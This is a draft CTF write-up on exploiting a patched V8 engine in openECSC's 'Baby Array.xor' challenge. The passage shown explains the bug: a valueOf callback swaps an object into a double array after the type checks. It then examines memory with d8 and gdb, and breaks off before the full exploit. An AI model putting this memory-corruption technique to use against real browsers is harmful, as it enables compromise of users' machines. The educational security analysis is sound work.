+++
title = 'Exploiting V8 at openECSC'
date = 2024-05-25T00:00:00Z
draft = false
tags = ['ctf','browser']
slug = "exploiting-v8-at-openecsc"
summary = "todo: fill this and also the date"
+++

**(DRAFT)**

Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in its [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.

Most V8 exploits tend to have two sides to them - figuring out a unique way to trigger some sort of a memory corruption of at least one byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.

<div class="challDetails">
	<div class="challTitle challHr">Baby Array.xor</div>
	<div class="challTags">
		<span class="challTag" style="background:#007bff">6 solves</span>
		<span class="challTag" style="background:#dc3545">418 points</span>
		<span class="challTag" style="background:#ffc107;color:#000">pwn</span>
	</div>
	<div class="challSection challHr">
		<p>In case you need to xor doubles...</p>
		<code style="color:#e83e8c">nc arrayxor.challs.open.ecsc2024.it 38020</code>
	</div>
	<div class="challSection challHr">
		<div class="challSubtitle">Attachments</div>
		<details class="challFiles"><summary>array.xor.zip</summary>
			<ul><!-- TODO: links -->
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/args.gn</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/d8</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">dist/snapshot_blob.bin</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">docker-compose.yml</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">Dockerfile</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">README.md</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">v8.patch</a></li>
			  <li><a href="https://github.com/ECSC2024/openECSC-2024" target="_blank">wrapper.py</a></li>
			</ul>
		</details>
	</div>
	<div class="challSection">
		<div class="challSubtitle">Solves</div>
		<table class="challScores">
		  <thead>
		    <tr>
		      <th>#</th>
		      <th>Time</th>
		      <th>User</th>
		    </tr>
		  </thead>
		  <tbody>
		    <tr>
		      <td>1</td>
		      <td>2024-05-15 18:02:34Z</td>
		      <td>rdj</td>
		    </tr>
		    <tr>
		      <td>2</td>
		      <td>2024-05-15 18:26:26Z</td>
		      <td>Diff-fusion</td>
		    </tr>
		    <tr>
		      <td>3</td>
		      <td>2024-05-16 04:25:57Z</td>
		      <td>crazyman</td>
		    </tr>
		    <tr>
		      <td>4</td>
		      <td>2024-05-16 09:52:43Z</td>
		      <td>hlt</td>
		    </tr>
		    <tr>
		      <td>5</td>
		      <td>2024-05-17 21:35:14Z</td>
		      <td>Popax21</td>
		    </tr>
		    <tr>
		      <td>6</td>
		      <td>2024-05-19 20:43:27Z</td>
		      <td>rebane2001 <span style="font-family:'Comic Sans MS',cursive;opacity:0.2;user-select:none">&lt;- me :o</span></td>
		    </tr>
		  </tbody>
		</table>
	</div>
</div>

## Part 1: Finding the memory corruption

The challenge consists of the V8 engine with some new functionality added through a patch:

```c
/*
  Array.xor()
  let x = [0.1, 0.2, 0.3];
  x.xor(5);
*/
BUILTIN(ArrayXor) {
  HandleScope scope(isolate);
  Factory *factory = isolate->factory();
  Handle<Object> receiver = args.receiver();
  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Nope")));
  }
  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  ElementsKind kind = array->GetElementsKind();
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
  // Array.xor() needs exactly 1 argument
  if (args.length() != 2) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs exactly one argument")));
  }
  // Get array len
  uint32_t length = static_cast<uint32_t>(Object::Number(array->length()));
  // Get xor value
  Handle<Object> xor_val_obj;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, xor_val_obj, Object::ToNumber(isolate, args.at(1)));
  uint64_t xor_val = static_cast<uint64_t>(Object::Number(*xor_val_obj));
  // Ah yes, xoring doubles..
  Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
    double x = elements->get_scalar(i);
    uint64_t result = (*(uint64_t*)&x) ^ xor_val;
    elements->set(i, *(double*)&result);
  });
  
  return ReadOnlyRoots(isolate).undefined_value();
}
```

The patch adds a new **Array.xor()** prototype that can be used to xor all values within an array of doubles, let's try it:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, <span class="jsConValIn">0.3</span>]</div>
	<!-- <div class="jsConBorder"></div> 🢒 ► ⋖ ≻
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">0.1</span>, <span class="jsConValOut">0.2</span>, <span class="jsConValOut">0.3</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">3fb999999999999a</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">3fc999999999999a</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">3fd3333333333333</span><br/>
</div>
	</details></div> -->
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>) <span class="jsConNull">// 0x539</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">0.10000000000001079</span>, <span class="jsConValOut">0.20000000000002158</span>, <span class="jsConValOut">0.30000000000004035</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x3fb9999999999<span class="jsConKw">ca3</span></span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x3fc9999999999<span class="jsConKw">ca3</span></span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x3fd3333333333<span class="jsConKw">60a</span></span><br/>
</div>
	</details></div>
</div>

<style>
.jsConsole {
	background: #282828;
	border-radius: 4px;
	width: calc(100% - 2px);
	color: #E3E3E3;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	font-size: 12px;
	border: 1px solid #5E5E5E;
	cursor: default;
}
.jsConsole *::selection {
	background: #004A77;
}
.jsConLine {
	min-height: 14px;
	margin: 3px;
	padding: 1px;
	width: calc(100% - 8px);
	border-radius: 4px;
}
.jsConCode {
	min-height: 14px;
	margin: 3px;
	padding: 7px;
	width: calc(100% - 20px);
	border-radius: 4px;
	white-space: pre-wrap;
	cursor: initial;
}
.jsConLine:has(details) {
	text-wrap: nowrap;
}
.jsConBorder {
	background: #5E5E5E;
	width: 100%;
	height: 1px;
}
.jsConLine:hover {
	background: #3D3D3D;
}
.jsConLine:has(.jsConErr):hover {
	background: #E46962;
}
.jsConLine > details {
	padding-left: 4px;
	display: inline-block;
	text-wrap: wrap;
	max-width: calc(100% - 4px - 18px);
}
.jsConLine > details > summary::marker {
	line-height: 0;
}
.jsConVar {
	color: #C7C7C7;
}
.jsConValIn {
	color: #C4EED0;
}
.jsConValOut {
	color: #9980FF;
}
.jsConFun {
	color: #FACC15;
}
.jsConIdx {
	color: #7CACF8;
}
.jsConB {
	font-weight: bold;
}
.jsConNull {
	color: #6F6F6F;
}
.jsConKw {
	color: #BF67FF;
}
.jsConStr {
	color: #FE8D59;
}
.jsConStrOut {
	color: #5CD5FB;
}
.jsConV8 {
	/* color: #9F0; */
	color: #FFF;
}
.jsConIcon {
	fill: #C7C7C7;
	display: inline-block;
	width: 16px;
	height: 14px;
	vertical-align: top;
	padding-right: 2px;
}
.jsConErr {
	background: #4E3534;
	color: #F9DEDC;
	padding: 4px;
	border-radius: 4px;
}
.jsConErr > .jsConIcon {
	padding-right: 4px;
}

@media (width >= 430px) {
	.under430 {
		display: none;
	}
}
@media (width < 430px) {
	.over430 {
		display: none;
	}
}
@media (width < 640px) {
	.over640 {
		display: none;
	}
}
@media (width >= 640px) {
	.under640 {
		display: none;
	}
	.termCodeComm {
		float: right;
	}
}
.termCode {
	white-space: pre-wrap;
	background: #000;
	color: #BBB;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	font-size: 12px;
	border-radius: 4px;
	width: calc(100% - 2px - 16px);
	border: 1px solid var(--lyreGold);
	padding: 8px;
	cursor: default;
}
.termCode::selection, .termCode *::selection {
	color: #000;
	background: var(--lyreGold);
}
.termCodeW {
	color: #FFF;
}
.termCodeComm {
	color: var(--lyreGold);
}
</style>

Quite the peculiar feature. It may seem a little confusing if you aren't familiar with [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) [doubles](https://en.wikipedia.org/wiki/Double-precision_floating-point_format), but it makes sense once we look at the hex representations of the values:

<div class="jsConsole" style="text-align:center; width: fit-content; margin: 0 auto">
	<div class="jsConLine">(<span class="jsConIdx">double</span>)&nbsp;<span class="jsConValIn">0.1</span> ^ (<span class="jsConIdx">uint64</span>)&nbsp;<span class="jsConValIn">1337</span> = (<span class="jsConIdx">double</span>)&nbsp;<span class="jsConValIn">0.10000000000001079</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine" style="white-space: pre">  <span class="jsConValIn">0x3fb9999999999<span class="jsConFun">99a</span></span></div>
	<div class="jsConLine">^ <span class="jsConValIn">0x0000000000000<span class="jsConFun">539</span></span></div>
	<div class="jsConLine">= <span class="jsConValIn">0x3fb9999999999<span class="jsConFun">ca3</span></span></div>
</div>

It pretty much just interprets the double as an integer, and then performs the XOR operation on it. In this example we XORed the doubles with 0x539 (1337 in hex), so the last three hex digits of each double changed. It's a pretty silly operation to perform on a double.

Just XORing doubles isn't going to get us anywhere though, since the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^1]) as just *raw 64-bit doubles*. All we can do is change some numbers around, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thingie on a mixed array (`PACKED_ELEMENTS`) consisting of *memory pointers* to other JavaScript objects, because we could point the pointers to places in memory we're not supposed to.

<!-- Alright, let's see if we can break it somehow.  .To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it . We'll see later why that is, but for now let's just try to find a way to do it. -->

Alright, let's try an array with an object in it then:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, {}] <span class="jsConNull">// PACKED_ELEMENTS array</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Array.xor needs array of double numbers</div></div>
</div>

Hmm, seems like there's a check in-place to prevent us from doing this:

```c
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }
```

But what if we create a double array, but then wrap it in an evil [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)?

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">0.1</span>, <span class="jsConValIn">0.2</span>, <span class="jsConValIn">0.3</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evilHandler</span> = <span style="white-space: pre-wrap">{
     <span class="jsConFun">get</span>(<span class="jsConIdx">target</span>, <span class="jsConIdx">prop</span>, <span class="jsConIdx">receiver</span>) {
       <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`Got </span>${<span class="jsConVar">prop</span>}<span class="jsConStr">!`</span>);
       <span class="jsConKw">return</span> <span class="jsConVar">Reflect</span>.<span class="jsConFun">get</span>(...<span class="jsConVar">arguments</span>);
     }
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = <span class="jsConKw">new</span> <span class="jsConVar">Proxy</span>(<span class="jsConVar">arr</span>, <span class="jsConVar">evilHandler</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got constructor!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got constructor!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got 0!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got 1!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got 2!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got length!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">0.1</span>, <span class="jsConValOut">0.2</span>, <span class="jsConValOut">0.3</span>]</i> <span class="jsConNull">// hehe, looks good!</span></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">3fb999999999999a</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">3fc999999999999a</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">3fd3333333333333</span><br/>
</div>
	</details></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"></svg>Got xor!</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Nope</div></div>
</div>

No dice, seems like they've thought of that too:

```c
if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
    factory->NewStringFromAsciiChecked("Nope")));
}
```

The **IsJSArray** method makes sure that we are in fact passing an array, and the **HasOnlySimpleReceiverElements** method checks for anything sus[^2] within the array or it's prototype.

Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and XORing such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.

The length of the array gets stored in a `uint32_t`, and I thought that perhaps we could overflow this value, but it turns out you can't make an array that big:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = <span class="jsConKw">new</span> <span class="jsConVar">Array</span>(<span class="jsConValIn">2</span>**<span class="jsConValIn">32</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>RangeError: Invalid array length</div></div>
</div>

I also tried messing with the length value, but v8 doesn't allow us to do that in a way that could be of use here:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">length</span> = <span class="jsConStr">"evil"</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>RangeError: Invalid array length</div></div>
  <div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">__defineGetter__</span>(<span class="jsConStr">"length"</span>, () => <span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Cannot redefine property: length</div></div>
  <div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">1337</span> <span class="jsConNull">// uh oh, our array is now a HOLEY_DOUBLE_ELEMENTS</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConValIn">1337</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><div class="jsConErr"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><circle fill="#E46962" cx="8" cy="7" r="6.5"/><polygon fill="#4E3534" points="4.8,4.6 5.6,3.8 8,6.2 10.4,3.8 11.2,4.6 8.8,7 11.2,9.4 10.4,10.2 8,7.8 5.6,10.2 4.8,9.4 7.2,7"/></svg>TypeError: Array.xor needs array of double numbers</div></div>
</div>

And then it hit me - we're only doing all those fancy checks on the array itself, but not the argument! We get the xor argument (`Object::ToNumber(isolate, args.at(1))`) *after* we're already past all the previous array checks, so perhaps we could turn the xor argument evil and put an object in the double array once we're already past the initial checks? Let's give it a shot:

<div class="jsConsole">
		<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = {<span style="white-space: pre-wrap">
     <span class="jsConFun">valueOf</span>: () => {
       <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {};
       <span class="jsConKw">return</span> <span class="jsConValIn">1337</span>;
     }
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>) <span class="jsConNull">// our array turns into PACKED_ELEMENTS here!</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">140508</span>, <span class="jsConValOut">2.2</span>, <span class="jsConValOut">140484</span>]</i> <span class="jsConNull">// waow!</span></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x000449b8</span> (<span class="jsConIdx">SMI</span>)<br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00044cbd</span> (<span class="jsConIdx">pointer to double</span>)<br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00044988</span> (<span class="jsConIdx">SMI</span>)<br/>
</div>
	</details></div>
</div>

We're cooking! <!-- todo: maybe change -->

## Part 2: Breaking out of bounds

Now that we've found a way to put some objects in an array and mess with their pointer, we must figure out a way to turn them into primitives we can actually use. There are a few different ways to accomplish this from here. I'll go with the path I took originally, but see if you can figure out any other ways to get there - I'll share a couple (arguably better ones) at the end of the post.

But first, we should look at how v8 stores stuff in the memory so that we can figure out what our memory corruption looks like and what we can do with it. How could we do that?

With the **d8 natives syntax** and a **debugger**! If we launch d8 (the v8 shell) with the `--allow-natives-syntax` flag, we can use various debug functions such as `%DebugPrint(obj)` to examine what's going on with objects, and if we combine that with a debugger ([gdb](https://gnu.org/software/gdb/) in this case) we can even check out the entire memory to understand it better. Let's try it:

<div class="termCode"><span class="termCodeW">&gt; gdb --args ./d8 --allow-natives-syntax</span> <span class="termCodeComm">&lt;-- use d8 with the natives syntax in gdb</span>
GNU gdb (GDB) 14.2
<span class="termCodeW">(gdb) run</span> <span class="termCodeComm">&lt;-- start d8</span>
Starting program: /home/lyra/Desktop/array.xor/dist/d8 --allow-natives-syntax
V8 version 12.7.0 (candidate)
<span class="termCodeW">d8&gt; arr = [1.1, 2.2, 3.3]</span> <span class="termCodeComm">&lt;-- create an array</span>
[1.1, 2.2, 3.3]
<span class="termCodeW">d8&gt; %DebugPrint(arr)</span> <span class="termCodeComm">&lt;-- debugprint the array</span>
DebugPrint: <span class="termCodeW">0xa3800042be9</span>: [JSArray] <span class="termCodeComm">&lt;-- we get the address here</span>
 - map: 0x0a38001cb7c5 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
 - elements: 0x0a3800042bc9 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x0a3800000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x0a3800042bc9 &lt;FixedDoubleArray[3]&gt; {
           0: 1.1
           1: 2.2
           2: 3.3
 }
0xa38001cb7c5: [Map] in OldSpace
 - map: 0x0a38001c01b5 &lt;MetaMap (0x0a38001c0205 &lt;NativeContext[295]&gt;)&gt;
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x0a38001cb785 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;
 - prototype_validity cell: 0x0a3800000a89 &lt;Cell value= 1&gt;
 - instance descriptors #1: 0x0a38001cb751 &lt;DescriptorArray[1]&gt;
 - transitions #1: 0x0a38001cb7ed &lt;TransitionArray[4]&gt;
   Transition array #1:
     0x0a3800000e5d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x0a38001cb805 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
 - constructor: 0x0a38001cae09 &lt;JSFunction Array (sfi = 0xa380002b2f9)&gt;
 - dependent code: 0x0a3800000735 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: 0
<!---->
[1.1, 2.2, 3.3]
<span class="termCodeW">d8&gt; ^Z</span> <span class="termCodeComm">&lt;-- suspend d8 (ctrl+z) to get to gdb</span>
Thread 1 "d8" received signal SIGTSTP, Stopped (user).
0x00007ffff7da000a in read () from /usr/lib/libc.so.6
<span class="termCodeW">(gdb) x/8xg 0xa3800042be9-1</span> <span class="termCodeComm">&lt;-- examine the array's address</span>
0xa3800042be8:	0x00000725001cb7c5	0x0000000600042bc9
0xa3800042bf8:	0x00bab9320000010d	0x7566280a00000adc
0xa3800042c08:	0x29286e6f6974636e	0x20657375220a7b20
0xa3800042c18:	0x3b22746369727473	0x6d2041202f2f0a0a
<span class="termCodeW">(gdb)</span></div>

